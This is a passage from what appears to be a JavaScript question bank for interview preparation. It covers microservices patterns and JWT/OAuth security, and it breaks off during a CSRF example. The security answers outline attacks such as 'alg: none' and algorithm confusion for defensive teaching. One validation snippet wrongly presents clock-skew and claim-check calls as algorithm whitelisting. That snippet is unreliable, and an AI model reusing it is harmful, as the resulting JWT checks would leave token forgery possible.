    return cachedResponse;  // same result, no duplicate charge
}
// First time: process payment, store key + response</pre>
<p><strong>Why it matters:</strong></p>
<ul>
<li>Networks fail: timeouts, retries happen automatically</li>
<li>Message queues may deliver the same message twice</li>
<li>Load balancers may send duplicate requests</li>
</ul>
<div class="key-point">Retries are normal in distributed systems. Idempotency is what keeps retries safe. Stripe, PayPal, and all payment APIs require idempotency keys.</div>`,
      },
      {
        q: 'What is distributed tracing and why do correlation IDs matter?',
        difficulty: 'medium',
        a: `<p><strong>Distributed tracing</strong> follows one user request across many services, showing the full journey and timing.</p>
<pre>User request: GET /checkout
  ↓
  [API Gateway] (2ms)
  ├── [Order Service] (15ms)
  │   ├── [Inventory Service] (8ms)
  │   └── [Pricing Service] (5ms)
  └── [Payment Service] (200ms) ← bottleneck!
      └── [Fraud Check Service] (180ms) ← root cause!

Trace ID: abc-123 (links ALL spans across services)
Span 1: API Gateway → Order Service (15ms)
Span 2: Order Service → Inventory Service (8ms)
Span 3: Order Service → Pricing Service (5ms)
Span 4: API Gateway → Payment Service (200ms)</pre>
<p><strong>Implementation:</strong></p>
<pre>// Propagate trace ID in headers
GET /inventory/check
Headers:
  X-Trace-Id: abc-123
  X-Span-Id: span-456
  X-Parent-Span-Id: span-123

// Log with correlation ID
logger.info("[trace=abc-123] Checking inventory for item 789")</pre>
<p><strong>Tools:</strong> Jaeger, Zipkin, AWS X-Ray, Datadog APM, OpenTelemetry (standard)</p>
<div class="key-point">Without trace/correlation IDs, debugging latency in microservices is like finding a needle in a haystack. OpenTelemetry is the emerging standard — invest in it early.</div>`,
      },
      {
        q: 'What is the Strangler Fig pattern in microservice migration?',
        difficulty: 'hard',
        a: `<p>The <strong>Strangler Fig</strong> pattern replaces parts of a monolith gradually by routing traffic to new services one feature at a time.</p>
<pre>Phase 1: All traffic goes to monolith
  [Users] → [Monolith: Auth + Orders + Reports + Users]

Phase 2: Extract Reports service
  [Users] → [Router/Proxy]
              ├── /reports → [New Reports Service] ✅
              └── /* → [Monolith: Auth + Orders + Users]

Phase 3: Extract Orders service  
  [Users] → [Router/Proxy]
              ├── /reports → [Reports Service] ✅
              ├── /orders → [New Orders Service] ✅
              └── /* → [Monolith: Auth + Users]

Phase N: Monolith is empty → decommission it</pre>
<p><strong>Key steps:</strong></p>
<ol>
<li>Put a proxy/API gateway in front of the monolith</li>
<li>Build new features as separate services</li>
<li>Gradually route traffic from monolith to new services</li>
<li>Keep both running in parallel for rollback safety</li>
</ol>
<div class="key-point">Named after the strangler fig tree that grows around a host tree, eventually replacing it. This is far safer than a "big bang" rewrite — you can stop at any point and still have a working system.</div>`,
      },
      {
        q: 'What is the Transactional Outbox pattern?',
        difficulty: 'hard',
        a: `<p><strong>Transactional Outbox</strong> ensures database writes and event publishing happen atomically — solving the dual-write problem.</p>
<pre>// The problem: dual-write inconsistency
1. Save order to DB ✅
2. Publish "OrderCreated" to Kafka ❌ (network error!)
→ Order exists but no event → downstream services never know!

// Solution: Transactional Outbox
1. In ONE database transaction:
   - Save order to orders table
   - Save event to outbox table
2. A separate worker polls outbox and publishes to Kafka
3. After successful publish, mark outbox row as sent

Table: outbox
| id | event_type    | payload              | published | created_at  |
| 1  | OrderCreated  | {"orderId": 123, ...}| false     | 2024-01-01  |</pre>
<pre>// Using Change Data Capture (CDC) — even better:
// Debezium reads DB transaction log → publishes to Kafka
// No polling needed, near real-time</pre>
<div class="key-point">The outbox pattern guarantees at-least-once delivery. Consumers must be idempotent. CDC with Debezium is the modern approach — no polling overhead.</div>`,
      },
      {
        q: 'What is the Saga pattern?',
        difficulty: 'hard',
        a: `<p><strong>Saga</strong> manages distributed business workflows using a sequence of local transactions plus compensating actions for rollback.</p>
<pre>Order Saga: Create Order → Charge Payment → Reserve Inventory → Confirm

If Inventory fails:
  Compensate: Refund Payment → Cancel Order</pre>
<p><strong>Two types:</strong></p>
<pre>// 1. Choreography (event-driven, decentralized)
Order Service → publishes "OrderCreated"
  → Payment Service listens → charges → publishes "PaymentCharged"
    → Inventory Service listens → reserves → publishes "InventoryReserved"
      → Order Service listens → confirms order

If failure: each service publishes compensation events

// 2. Orchestration (central coordinator)
[Saga Orchestrator]
  → Step 1: Call Order Service → "create order"
  → Step 2: Call Payment Service → "charge payment"
  → Step 3: Call Inventory Service → "reserve stock" (FAILS!)
  → Compensate Step 2: "refund payment"
  → Compensate Step 1: "cancel order"</pre>
<table><tr><th>Aspect</th><th>Choreography</th><th>Orchestration</th></tr>
<tr><td>Coupling</td><td>Loose (events)</td><td>Tighter (orchestrator knows flow)</td></tr>
<tr><td>Complexity</td><td>Hard to follow for many steps</td><td>Clear flow in one place</td></tr>
<tr><td>Best for</td><td>Simple sagas (2-3 steps)</td><td>Complex sagas (5+ steps)</td></tr></table>
<div class="key-point">Every saga step MUST have a compensating action defined. Without compensation, partial failures leave the system in an inconsistent state.</div>`,
      },
      {
        q: 'What is a service mesh and when would you use one?',
        difficulty: 'hard',
        a: `<p>A <strong>service mesh</strong> is an infrastructure layer that handles service-to-service communication, moving networking concerns out of application code into sidecar proxies.</p>
<pre>Without service mesh:
  Each service handles: retries, circuit breakers, mTLS, tracing, load balancing
  → Duplicated logic in every service, every language

With service mesh (e.g., Istio/Linkerd):
  [Service A] ↔ [Sidecar Proxy] ←mesh→ [Sidecar Proxy] ↔ [Service B]
                      ↑                       ↑
                  Handles: mTLS, retries, circuit breaking,
                  traffic splitting, observability</pre>
<p><strong>Features:</strong></p>
<ul>
<li><strong>mTLS</strong>: automatic encryption between services</li>
<li><strong>Traffic management</strong>: canary releases, A/B testing, fault injection</li>
<li><strong>Observability</strong>: distributed tracing, metrics without code changes</li>
<li><strong>Resilience</strong>: retries, timeouts, circuit breakers configured declaratively</li>
</ul>
<p><strong>When to use:</strong></p>
<ul>
<li>20+ microservices where consistent networking policies matter</li>
<li>Strict security requirements (zero-trust, mTLS everywhere)</li>
<li>Polyglot environment (services in different languages)</li>
</ul>
<div class="key-point">Service meshes add operational complexity and latency (extra proxy hop). Don't adopt one until you have enough services that manual networking configuration becomes painful. Istio and Linkerd are the most popular options.</div>`,
      },
      {
        q: 'What resilience patterns are commonly used in microservices?',
        difficulty: 'hard',
        a: `<ul>
<li><strong>Timeout</strong>: Don't wait forever. Set max wait time for external calls.</li>
<li><strong>Retry</strong>: Try again on transient failures (with exponential backoff + jitter).</li>
<li><strong>Circuit Breaker</strong>: Stop calling a failing service. Fail fast instead of cascading.</li>
<li><strong>Bulkhead</strong>: Isolate failures. Separate thread pools per dependency.</li>
<li><strong>Fallback</strong>: Provide degraded functionality when a dependency is down.</li>
</ul>
<pre>// Resilience4j example (Java):
@CircuitBreaker(name = "paymentService", fallbackMethod = "paymentFallback")
@Retry(name = "paymentService", maxAttempts = 3)
@TimeLimiter(name = "paymentService", timeoutDuration = 2s)
@Bulkhead(name = "paymentService", maxConcurrentCalls = 10)
public PaymentResult charge(PaymentRequest req) {
    return paymentClient.charge(req);
}

public PaymentResult paymentFallback(PaymentRequest req, Exception ex) {
    return PaymentResult.pending("Payment queued for retry");
}

// Real scenario:
// Recommendation service is slow →
// timeout → open circuit → serve page without recommendations
// User still sees the page, just without recommendations</pre>
<div class="key-point">Layer these patterns: Timeout inside Retry inside Circuit Breaker. Never retry without timeouts and limits — retries without backoff can amplify outages (retry storm).</div>`,
      },
      {
        q: 'What is health checking and readiness vs liveness probes?',
        difficulty: 'medium',
        a: `<p>Health checks tell the infrastructure whether a service instance is working correctly.</p>
<ul>
<li><strong>Liveness probe</strong>: "Is the process alive?" If it fails, the container is <strong>restarted</strong>.</li>
<li><strong>Readiness probe</strong>: "Can it handle traffic?" If it fails, traffic is <strong>removed</strong> from load balancer (but container keeps running).</li>
<li><strong>Startup probe</strong>: "Has it finished starting?" Prevents liveness checks from killing slow-starting apps.</li>
</ul>
<pre># Kubernetes health checks:
livenessProbe:
  httpGet:
    path: /actuator/health/liveness
    port: 8080
  initialDelaySeconds: 15
  periodSeconds: 10

readinessProbe:
  httpGet:
    path: /actuator/health/readiness
    port: 8080
  periodSeconds: 5

# Spring Boot Actuator:
# /actuator/health/liveness → checks process is alive
# /actuator/health/readiness → checks DB connection, disk space, etc.</pre>
<div class="key-point">A common mistake: putting DB checks in the liveness probe. If the DB is temporarily down, all service instances restart in a loop (crash cascade). Put DB checks in readiness probe instead.</div>`,
      },
      {
        q: 'What is the dual-write problem?',
        difficulty: 'tricky',
        a: `<p>The trap behind most broken event-driven systems: a service must update its database <strong>and</strong> publish an event — and those are two systems that cannot share a transaction.</p>
<pre>// ❌ The broken code that looks fine in review:
@Transactional
public void createOrder(Order order) {
  orderRepository.save(order);          // DB write (transactional)
  kafkaTemplate.send("orders", event);  // Kafka publish (NOT in the transaction!)
}

Failure modes:
  1. DB commits, Kafka send fails/crashes  → order exists, downstream never told
  2. Publish first, then DB fails          → downstream reacts to an order
                                             that doesn't exist
  3. Kafka send inside @Transactional but before commit
     → consumer reads the event, queries your API, gets 404 (not committed yet)</pre>
<p><strong>Correct solutions — make one system the source of truth:</strong></p>
<ul>
<li><strong>Transactional Outbox</strong>: write the event into an <code>outbox</code> table in the SAME DB transaction as the business data; a relay (poller or Debezium CDC) publishes it to Kafka afterwards. At-least-once → consumers must dedupe.</li>
<li><strong>Change Data Capture</strong>: Debezium tails the DB write-ahead log and turns committed rows into events — the DB commit IS the publish decision.</li>
<li><strong>Event sourcing</strong>: the event log is the primary store; DB state is derived — no second write to reconcile.</li>
</ul>
<div class="key-point">The general law: you can never atomically write to two independent systems without 2PC. Any design with "save to DB and also push to queue/cache/search-index" has this bug until proven otherwise — interviewers use it to test if you've operated real event-driven systems.</div>`,
      },
      {
        q: 'What is a distributed monolith? What are the warning signs?',
        difficulty: 'tricky',
        a: `<p>A <strong>distributed monolith</strong> has microservice <em>costs</em> (network, ops, partial failure) with monolith <em>coupling</em> — the worst of both worlds. It's what most failed microservice migrations produce.</p>
<p><strong>Warning signs checklist:</strong></p>
<ul>
<li><strong>Lockstep deploys</strong>: releasing service A requires releasing B and C at the same time (shared release train).</li>
<li><strong>Synchronous call chains</strong>: A → B → C → D to serve one request; availability = product of all (99.9%⁴ ≈ 99.6%), latency = sum.</li>
<li><strong>Shared database</strong>: two services read/write the same tables — schema changes need cross-team coordination; it's one data model wearing two costumes.</li>
<li><strong>Chatty interfaces</strong>: one business operation = dozens of fine-grained calls between two services (the boundary is in the wrong place).</li>
<li><strong>Shared domain libraries</strong>: bumping <code>common-domain-model.jar</code> forces redeploying every service.</li>
<li><strong>Distributed transactions</strong> needed for routine operations.</li>
</ul>
<pre>The test: "Can you deploy this service alone, on a Tuesday,
without asking any other team?"  No → distributed monolith.</pre>
<p><strong>How to fix / avoid:</strong> split by business capability (not by layer or entity), give each service its own data, prefer async events over sync chains, enforce backward-compatible APIs so deploys decouple.</p>
<div class="key-point">Senior take: a well-modularized monolith beats a distributed monolith every time — you pay network and consistency costs only when you get independent deployability and scaling in return. "We split the code but not the data or the deploys" is the standard failure story.</div>`,
      },
      {
        q: 'When do retries make an outage worse? (retry storms, backoff, jitter)',
        difficulty: 'tricky',
        a: `<p>Retries are a load <em>amplifier</em>. During a partial outage, naive retries multiply traffic exactly when the system can least afford it — often converting a slowdown into a total collapse.</p>
<pre>The amplification math (3 attempts per layer):
  Client → Gateway → Service A → Service B (struggling)
  3 × 3 × 3 = 27× load on B during ITS worst moment

The death spiral:
  B slows → callers time out → all retry → B's queue grows →
  B slower → more retries → B dies → traffic shifts → C dies…</pre>
<p><strong>Doing retries right:</strong></p>
<pre>// Exponential backoff + FULL JITTER (AWS-recommended):
delay = random(0, min(cap, base × 2^attempt))
// jitter is not optional: without it, all clients that failed together
// retry together — synchronized waves ("retry herd")

Rules:
  1. Retry only idempotent operations (GET, PUT with key) — or use idempotency keys
  2. Retry only retryable errors: 503, 429, timeouts.  NEVER 400/401/404
  3. Cap attempts (2–3), cap total time; honor Retry-After headers
  4. Retry at ONE layer (usually the edge), not every hop
  5. Retry BUDGET (e.g. retries ≤ 10% of requests) — beyond that, fail fast
  6. Combine with circuit breaker: stop hammering a dead dependency
  7. Deadline propagation: don't retry work whose caller already gave up</pre>
<div class="key-point">Interview gold: "retries trade increased load for reduced error rate — a good trade only when failures are transient and load isn't the cause." If the dependency is overloaded, retries are gasoline. That's why retry budgets and circuit breakers exist.</div>`,
      },
      {
        q: 'How do you decide service boundaries when splitting a monolith?',
        difficulty: 'hard',
        a: `<p>The hardest microservices question because there's no formula — interviewers want your <em>heuristics</em>.</p>
<p><strong>Primary tool: DDD bounded contexts.</strong> Split along business capabilities, where the <em>language changes meaning</em>:</p>
<pre>"Product" means different things per context:
  Catalog   : name, images, description, SEO
  Inventory : SKU, stock count, warehouse location
  Pricing   : price, discounts, tax category
→ three contexts, three services, three models —
  NOT one giant shared Product entity</pre>
<p><strong>Heuristics for a good boundary:</strong></p>
<ul>
<li><strong>Changes together → stays together</strong>: if every feature touches services A and B, the boundary is wrong (check your git history — files that co-change belong together).</li>
<li><strong>Data ownership is decidable</strong>: exactly one service writes each piece of data.</li>
<li><strong>Coarse interface</strong>: one business operation ≈ one call, not a chatty conversation.</li>
<li><strong>Team-sized</strong>: one team owns it end to end (Conway's law is a tool — align service and team boundaries).</li>
<li><strong>Different scaling/availability needs</strong>: image processing vs checkout.</li>
</ul>
<p><strong>Anti-patterns:</strong> entity services (UserService, OrderService, ProductService that are just tables with HTTP on top — every operation spans all of them), layer services (UI-service / logic-service / data-service), nano-services (operational cost &gt; value).</p>
<p><strong>Process: Strangler Fig</strong> — extract the highest-value, least-coupled capability first, route traffic to it, repeat. Start with a modular monolith if boundaries are still unclear; module lines are cheap to move, network lines are not.</p>
<div class="key-point">Best one-liner: "Services should be loosely coupled and highly cohesive — if you must open three services to ship one feature, you drew the lines wrong." Wrong boundaries cost more than no boundaries.</div>`,
      },
      {
        q: 'How do you guarantee event ordering in event-driven microservices?',
        difficulty: 'tricky',
        a: `<p>Trick premise alert: there is <strong>no global ordering</strong> in a distributed system — the real question is <em>what scope of ordering do you actually need?</em> Usually: per entity.</p>
<pre>Kafka's model:
  - Ordering is guaranteed ONLY within a partition
  - Same key → same partition → in order

  producer.send("orders", key = orderId, event);
  // OrderCreated(42), OrderPaid(42), OrderShipped(42)
  // → all on one partition → consumed in order ✅
  // Events for DIFFERENT orders may interleave — and that's fine.</pre>
<p><strong>Where ordering silently breaks (the senior checklist):</strong></p>
<ul>
<li><strong>Producer retries</strong>: send 1 fails, send 2 succeeds, retry of 1 lands after 2 → set <code>enable.idempotence=true</code> (dedupes and preserves order per partition).</li>
<li><strong>Consumer-side parallelism</strong>: consuming a partition then spraying events into a thread pool destroys the ordering Kafka gave you. Parallelize <em>by key</em>, not round-robin.</li>
<li><strong>Repartitioning</strong>: changing partition count remaps keys → old and new events for one entity split across partitions during transition.</li>
<li><strong>Multiple producers</strong> for one entity (or dual-write paths) → no defined order at all.</li>
</ul>
<p><strong>Designing to need less ordering:</strong></p>
<pre>- Version/sequence number in the event: consumer rejects stale
    if (event.version &lt;= current.version) skip;
- Full-state ("fat") events instead of deltas → last-write-wins is safe
- Idempotent handlers → duplicates and some reorderings become harmless</pre>
<div class="key-point">Interview-ready summary: "Partition by aggregate ID for per-entity ordering, idempotent producer against retry reordering, keep per-key ordering through the consumer, and version events so out-of-order delivery is detectable. Global ordering doesn't exist and designs that require it don't scale."</div>`,
      },
      {
        q: 'How do you join data across microservices, each with its own database?',
        difficulty: 'tricky',
        a: `<p>The question that exposes whether database-per-service was understood: "Show orders together with customer names" — but orders and customers live in different services. <code>JOIN</code> is gone. Options:</p>
<p><strong>1. API composition (sync)</strong> — fine for small result sets:</p>
<pre>GET /orders?userId=42        → Order Service
GET /customers/42            → Customer Service
→ merge in the caller (API gateway / BFF)

Problems: N+1 calls for lists, latency = slowest call,
          no cross-service filtering/sorting/pagination
          ("orders of customers in Berlin, sorted by name" = fetch everything 😱)</pre>
<p><strong>2. CQRS materialized view (async)</strong> — the scalable answer:</p>
<pre>Customer Service ──CustomerUpdated──▶ ┌──────────────────┐
                                      │  Order-History    │
Order Service ────OrderCreated──────▶ │  View Service     │
                                      │  (denormalized DB │
                                      │   or Elasticsearch)│
Query: one SELECT on the pre-joined view — fast, filterable, pageable
Cost : eventual consistency + view rebuild logic</pre>
<p><strong>3. Replicate a slice of the data</strong> — Order Service keeps a local copy of just <code>(customerId, name)</code>, updated by subscribing to customer events. Duplication is a feature here, not a sin: reads stay local and the service works even when Customer Service is down.</p>
<p><strong>Anti-patterns:</strong> reaching into another service's database directly (couples you to their schema — the #1 microservice sin), and cross-service distributed queries at request time.</p>
<div class="key-point">Senior framing: "In microservices you move joins from query time to <em>write time</em> — events keep a denormalized view fresh, and queries become single-service reads. You trade consistency lag for autonomy and read performance." If a query needs fresh, transactional joins across two services, that's evidence they should be one service.</div>`,
      },
      {
        q: 'How do you evolve an API without breaking consumers? (contracts and versioning)',
        difficulty: 'hard',
        a: `<p>Independent deployability — the whole point of microservices — dies the moment an API change forces consumers to upgrade simultaneously. Compatibility discipline is what keeps it alive.</p>
<pre>SAFE (backward-compatible):          BREAKING:
  + add optional field to response     - remove/rename a field
  + add optional request param         - change a field's type/format
  + add new endpoint                   - make optional field required
  + add enum value (careful!)          - change error codes/semantics
                                       - tighten validation rules</pre>
<p><strong>1. Tolerant reader (Postel's law)</strong>: consumers ignore unknown fields and don't fail on additions — e.g. don't configure Jackson to <code>FAIL_ON_UNKNOWN_PROPERTIES</code>.</p>
<p><strong>2. Expand–contract (parallel change)</strong> for unavoidable breaking changes:</p>
<pre>Goal: rename "name" → "fullName"
  EXPAND  : write BOTH fields; readers still use "name"
  MIGRATE : consumers switch to "fullName" at their own pace
  CONTRACT: telemetry shows zero readers of "name" → remove it
No simultaneous deploy ever required.</pre>
<p><strong>3. Consumer-driven contract testing (Pact)</strong> — catches breakage in CI, before deploy:</p>
<pre>Consumer declares what it uses:  "GET /users/42 → { id, name }"
  → contract published to a broker
Provider's CI replays every consumer contract against the real service
  → provider removes "name" → PROVIDER's build fails, listing who breaks
"can-i-deploy" gate: verified against all consumer versions in prod</pre>
<p><strong>4. Explicit versioning as last resort</strong> (URL <code>/v2/</code>, header, or media type): you now run and patch two APIs — an operational cost, not a strategy. Prefer additive evolution so v2 is rare.</p>
<div class="key-point">Ranked senior answer: "Additive changes + tolerant readers by default, expand–contract for breaking changes, contract tests to enforce it in CI, explicit versions only when a redesign is unavoidable." Bonus nuance: internal service-to-service APIs can evolve via expand–contract almost indefinitely; long-lived public APIs are where versioning earns its cost.</div>`,
      },
    ],
  },

  // ========================= SECURITY & JWT =========================,
  {
    id: 'security-jwt',
    name: 'Security & JWT',
    icon: '🔒',
    questions: [
      {
        q: 'What is JWT and what are its three parts?',
        difficulty: 'easy',
        a: `<p><strong>JWT (JSON Web Token)</strong> is a compact, URL-safe token format for securely transmitting claims between parties.</p>
<pre>// JWT structure: header.payload.signature
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEyM30.SflKxwRJSMeKKF2QT4fwpM

// Decoded:
Header:  { "alg": "HS256", "typ": "JWT" }
Payload: { "userId": 123, "role": "admin", "exp": 1699999999 }
Signature: HMACSHA256(base64(header) + "." + base64(payload), secret)</pre>
<ul>
<li><strong>Header</strong>: algorithm (HS256, RS256) and token type</li>
<li><strong>Payload</strong>: claims — registered (exp, iss, sub), public, private</li>
<li><strong>Signature</strong>: ensures token hasn't been tampered with</li>
</ul>
<div class="key-point">JWT is Base64-encoded, NOT encrypted. Anyone can decode and read the payload. Never put passwords or sensitive data in the payload. The signature only guarantees integrity, not confidentiality.</div>`,
      },
      {
        q: 'What is the difference between access tokens and refresh tokens?',
        difficulty: 'medium',
        a: `<ul>
<li><strong>Access token</strong>: short-lived (5-30 min), sent with every API request, used for authorization.</li>
<li><strong>Refresh token</strong>: long-lived (days-weeks), used ONLY to get new access tokens, stored more securely.</li>
</ul>
<pre>// Flow:
1. Login → Server returns: { accessToken (15min), refreshToken (7d) }
2. API calls: Authorization: Bearer &lt;accessToken&gt;
3. Access token expires → 401 Unauthorized
4. POST /refresh { refreshToken } → new accessToken
5. Continue API calls with new accessToken

// Why two tokens?
// Short access token = limited damage window if stolen
// Long refresh token = user doesn't re-login constantly
// Refresh token can be revoked server-side</pre>
<p><strong>Security considerations:</strong></p>
<ul>
<li>Rotate refresh tokens on each use (one-time use)</li>
<li>Store refresh tokens in HttpOnly cookies or server-side</li>
<li>Detect refresh token reuse (indicates theft)</li>
</ul>
<div class="key-point">If an attacker steals an access token, the damage is limited to its lifetime (minutes). If they steal a refresh token, you can revoke it server-side. This is why refresh tokens need stronger protection.</div>`,
      },
      {
        q: 'Where should JWT be stored in the browser?',
        difficulty: 'hard',
        a: `<table style="width:100%;border-collapse:collapse;margin:10px 0;font-size:.88rem;">
<tr><th style="text-align:left;padding:6px;border-bottom:1px solid #ccc;">Storage</th><th style="padding:6px;border-bottom:1px solid #ccc;">XSS Risk</th><th style="padding:6px;border-bottom:1px solid #ccc;">CSRF Risk</th><th style="padding:6px;border-bottom:1px solid #ccc;">Survives Refresh</th></tr>
<tr><td style="padding:6px;">localStorage</td><td style="padding:6px;">❌ High (JS accessible)</td><td style="padding:6px;">✅ None</td><td style="padding:6px;">✅ Yes</td></tr>
<tr><td style="padding:6px;">HttpOnly Cookie</td><td style="padding:6px;">✅ Safe (JS can't read)</td><td style="padding:6px;">❌ Needs SameSite/CSRF token</td><td style="padding:6px;">✅ Yes</td></tr>
<tr><td style="padding:6px;">Memory (variable)</td><td style="padding:6px;">✅ Safest</td><td style="padding:6px;">✅ None</td><td style="padding:6px;">❌ Lost on refresh</td></tr>
</table>
<pre>// Recommended approach:
// Access token: in memory (JavaScript variable)
// Refresh token: HttpOnly + Secure + SameSite=Strict cookie

// Cookie setup (server-side):
Set-Cookie: refreshToken=xyz;
  HttpOnly;       // JS can't access → XSS safe
  Secure;         // HTTPS only
  SameSite=Strict; // prevents CSRF
  Path=/api/refresh; // only sent to refresh endpoint
  Max-Age=604800     // 7 days</pre>
<div class="key-point">The strongest default: short-lived access tokens in memory + refresh tokens in HttpOnly cookies. This protects against both XSS (can't steal from memory/HttpOnly) and CSRF (SameSite).</div>`,
      },
      {
        q: 'How do you validate JWT securely on the backend?',
        difficulty: 'hard',
        a: `<pre>// JWT validation checklist:
1. Verify SIGNATURE with the correct key/secret
2. Check EXPIRATION (exp claim) — reject expired tokens
3. Check NOT-BEFORE (nbf claim) — reject if before activation
4. Validate ISSUER (iss) — must match your auth server
5. Validate AUDIENCE (aud) — must match your API
6. WHITELIST allowed algorithms — prevent algorithm confusion attack

// Java (Spring Security + jjwt):
Claims claims = Jwts.parserBuilder()
    .setSigningKey(secretKey)           // verify signature
    .requireIssuer("https://auth.myapp.com")  // validate issuer
    .requireAudience("my-api")         // validate audience
    .build()
    .parseClaimsJws(token)             // throws if invalid
    .getBody();

// Check expiration is automatic with jjwt

// CRITICAL: Never do this!
❌ Jwts.parser().setSigningKey(key).parse(token)  // 'parse' accepts unsigned!
✅ Jwts.parser().setSigningKey(key).parseClaimsJws(token)  // 'parseClaimsJws' requires signature</pre>
<p><strong>Algorithm confusion attack:</strong></p>
<pre>// Attacker changes header: { "alg": "none" }
// If server accepts "none" algorithm → anyone can forge tokens!
// Always whitelist: .setAllowedClockSkewSeconds(30)
//                    .require("alg", "RS256")</pre>
<div class="key-point">Never trust a decoded token unless the signature and ALL claims are verified. The most dangerous mistake: accepting <code>alg: none</code> or using the wrong key type.</div>`,
      },
      {
        q: 'What are common JWT security vulnerabilities?',
        difficulty: 'hard',
        a: `<ol>
<li><strong>Algorithm confusion</strong>: Attacker changes RS256→HS256, uses public key as HMAC secret. Fix: whitelist algorithms.</li>
<li><strong>Weak signing secret</strong>: Short secrets can be brute-forced. Fix: use 256+ bit random secrets or asymmetric keys.</li>
<li><strong>Long token lifetime</strong>: Stolen tokens valid for hours/days. Fix: short-lived access tokens (5-15 min).</li>
<li><strong>Sensitive data in payload</strong>: JWT is encoded, not encrypted. Fix: never put passwords, SSNs, or PII in tokens.</li>
<li><strong>Missing revocation</strong>: JWT is stateless — no way to invalidate. Fix: short lifetime + server-side refresh token revocation.</li>
<li><strong>Token stored in localStorage</strong>: Accessible via XSS. Fix: use HttpOnly cookies or memory.</li>
<li><strong>No audience/issuer check</strong>: Token from Service A accepted by Service B. Fix: validate iss and aud claims.</li>
</ol>
<pre>// Vulnerability: algorithm confusion attack
// Attacker takes RS256 token, changes header to HS256
// Signs with the PUBLIC KEY (which is... public!)
// Server using "flexible" algorithm verification → accepts it!
// Fix: ALWAYS enforce expected algorithm on the server</pre>
<div class="key-point">Most JWT problems come from implementation mistakes, not from the token format itself. Use well-maintained libraries (jose, jjwt, jsonwebtoken) and follow their security guides.</div>`,
      },
      {
        q: 'How do you handle logout or revocation with JWT?',
        difficulty: 'hard',
        a: `<p>JWT is stateless by design — there's no built-in way to invalidate a token before it expires. Here are strategies:</p>
<pre>// Strategy 1: Short-lived access tokens (simplest)
Access token: 5-15 minutes
→ After logout, token expires quickly on its own
→ Con: still valid for a few minutes after logout

// Strategy 2: Token blacklist (for immediate logout)
On logout:
  → Add token ID (jti claim) to Redis blacklist
  → Set TTL = token's remaining lifetime
  → On every request: check if jti is blacklisted

BLACKLIST in Redis:
  SET "revoked:abc123" "" EX 900  // expires in 15 min

// Strategy 3: Server-side refresh token store (recommended)
On logout:
  → Delete refresh token from database
  → Access token expires naturally (short-lived)
  → User can't get new access tokens

// Strategy 4: Token versioning
User table: { id, tokenVersion: 5 }
JWT payload: { userId: 123, tokenVersion: 5 }
On logout: increment tokenVersion to 6
→ All existing tokens with version 5 become invalid</pre>
<div class="key-point">The practical approach: short-lived access tokens (5 min) + revocable server-side refresh tokens. Immediate logout everywhere needs a revocation store (Redis blacklist or token versioning).</div>`,
      },
      {
        q: 'What is the difference between OAuth 2.0 and JWT?',
        difficulty: 'medium',
        a: `<ul>
<li><strong>OAuth 2.0</strong>: an <strong>authorization framework</strong> that defines flows for granting access. It specifies WHO can access WHAT.</li>
<li><strong>JWT</strong>: a <strong>token format</strong> that encodes claims as JSON. It's a container, not a protocol.</li>
</ul>
<pre>OAuth 2.0 can use different token formats:
  - JWT (self-contained, no DB lookup needed)
  - Opaque tokens (random string, server must look up)

JWT can be used outside OAuth:
  - Session replacement in your own auth system
  - API key alternative
  - Service-to-service authentication

// Typical combination:
OAuth 2.0 Authorization Server → issues JWT access tokens
Resource Server → validates JWT without calling auth server</pre>
<div class="key-point">OAuth 2.0 is the "process" (how to get a token). JWT is the "envelope" (what the token looks like). They're complementary, not competing.</div>`,
      },
      {
        q: 'What is OpenID Connect and how is it related to OAuth 2.0?',
        difficulty: 'medium',
        a: `<p><strong>OpenID Connect (OIDC)</strong> is an identity layer built ON TOP of OAuth 2.0.</p>
<pre>OAuth 2.0 alone:
  "This app can access your Google Drive photos"
  → Authorization (access to resources)
  → Doesn't tell you WHO the user is

OIDC adds:
  "The user is john@gmail.com, their name is John Doe"
  → Authentication (identity verification)
  → Returns an ID Token (JWT) with user info

// OIDC flow:
1. App redirects to Google: scope=openid email profile
2. User logs in on Google
3. Google returns:
   - Access Token (OAuth): for API access
   - ID Token (OIDC): JWT with user identity
   - Refresh Token: for renewing access

// ID Token payload:
{
  "iss": "https://accounts.google.com",
  "sub": "1234567890",        // unique user ID
  "email": "john@gmail.com",
  "name": "John Doe",
  "picture": "https://...",
  "exp": 1699999999
}</pre>
<div class="key-point">When someone says "Login with Google/GitHub/Microsoft", that's OIDC in action. OAuth 2.0 handles the authorization, OIDC adds the user identity on top.</div>`,
      },
      {
        q: 'What is the difference between RBAC and ABAC?',
        difficulty: 'medium',
        a: `<ul>
<li><strong>RBAC (Role-Based Access Control)</strong>: permissions granted based on user's role.</li>
<li><strong>ABAC (Attribute-Based Access Control)</strong>: permissions based on attributes of user, resource, environment.</li>
</ul>
<pre>// RBAC: simple role checks
if (user.role === "ADMIN") → allow DELETE /users
if (user.role === "EDITOR") → allow PUT /articles
if (user.role === "VIEWER") → allow GET /articles

// ABAC: attribute-based rules (more flexible)
ALLOW if:
  user.department === resource.department AND
  user.clearanceLevel >= resource.sensitivityLevel AND
  currentTime is within businessHours AND
  request.ipAddress is in allowedNetwork

// Example:
"A doctor can view patient records ONLY in their own department,
 ONLY during working hours, ONLY from hospital network"
→ RBAC can't express this easily, ABAC can</pre>
<table><tr><th>Aspect</th><th>RBAC</th><th>ABAC</th></tr>
<tr><td>Complexity</td><td>Simple</td><td>Complex</td></tr>
<tr><td>Granularity</td><td>Coarse (role-level)</td><td>Fine (attribute-level)</td></tr>
<tr><td>Scalability</td><td>Role explosion risk</td><td>Scales with policies</td></tr>
<tr><td>Best for</td><td>Most web apps</td><td>Healthcare, finance, government</td></tr></table>
<div class="key-point">Start with RBAC for most applications. Move to ABAC when you need rules like "users can only edit their own department's documents during business hours."</div>`,
      },
      {
        q: 'What is the difference between CORS and CSRF?',
        difficulty: 'medium',
        a: `<p>Two completely different security concepts that are often confused:</p>
<ul>
<li><strong>CORS (Cross-Origin Resource Sharing)</strong>: A browser security <strong>mechanism</strong> that controls which origins can make requests to your API.</li>
<li><strong>CSRF (Cross-Site Request Forgery)</strong>: An <strong>attack</strong> where a malicious site tricks a user's browser into making unwanted requests to your API.</li>
</ul>
<pre>// CORS: browser blocks cross-origin requests by default
// Your app: https://myapp.com
// Your API: https://api.myapp.com
// Browser: "Different origin! Block unless API says it's OK"

// Server response headers:
Access-Control-Allow-Origin: https://myapp.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Authorization, Content-Type

// CSRF attack:
// 1. User is logged into bank.com (has session cookie)
// 2. User visits evil.com
